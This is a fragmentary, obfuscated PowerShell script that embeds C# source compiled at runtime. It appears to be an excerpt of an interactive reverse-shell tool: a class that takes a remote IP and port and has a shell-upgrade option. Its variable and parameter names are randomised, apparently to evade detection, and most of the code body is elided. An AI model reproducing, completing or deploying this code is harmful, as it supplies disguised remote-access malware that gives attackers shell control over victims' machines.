...
{   
    ...
    if( $PSBoundParameters.ContainsKey('Upgrade') ) {
        ...
        if(-Not($PSBoundParameters.ContainsKey('ZDdXiNAo99'))) {
            throw "ZDdXiNAo99 missing parameter"
        }
        
        if(-Not($PSBoundParameters.ContainsKey('VNtJBYip99'))) {
            throw "VNtJBYip99 missing parameter"
        }
    }
    $TkPJgAHw99 = @($ZDdXiNAo99, $VNtJBYip99, $Rows, $Cols, $ajqiUwpy99)
    Add-Type -TypeDefinition $kbNstTtf99 -Language CSharp;
    $dvuRFoAg99 = [IronPtyMainClass]::IronPtyMain($TkPJgAHw99)
    Write-Output $dvuRFoAg99
}
$kbNstTtf99 = @"
using System;
using System.IO;
...
public static class IronPtyMainClass
{
    ...
    private static string CheckZDdXiNAo99Arg(string ipString)
    {
        IPAddress address;
    ...
    public static string IronPtyMain(string[] args)
    {
        ...
        else
        {
            ...
            try
            {
                ...
                {
                    remoteIp = CheckZDdXiNAo99Arg(args[0]);
